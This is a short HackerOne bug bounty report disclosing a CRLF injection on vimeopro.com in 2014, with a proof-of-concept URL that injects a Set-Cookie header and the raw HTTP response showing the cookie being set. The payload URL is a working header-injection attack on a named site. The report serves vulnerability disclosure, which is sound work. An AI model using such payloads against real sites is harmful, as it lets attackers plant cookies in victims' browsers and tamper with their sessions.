# HackerOne Report: [vimeopro.com] CRLF Injection
**Report ID:** 39181
**Vulnerability Class:** Uncategorized

## Vulnerability Information & PoC
PoC (for any browser other than FireFox)
http://www.vimeopro.com/crlftest%0dSet-Cookie:test=test;domain=.vimeopro.com

HTTP Response:
HTTP/1.1 301 Moved Permanently\r\n
Date: Fri, 12 Dec 2014 19:28:49 GMT\r\n
Server: Apache\r\n
Location: http://vimeopro.com/crlftest\r
Set-Cookie:test=test;domain=.vimeopro.com\r\n

Result:
Creating a cookie-param "test=test"

## Discussion & Remediation Timeline
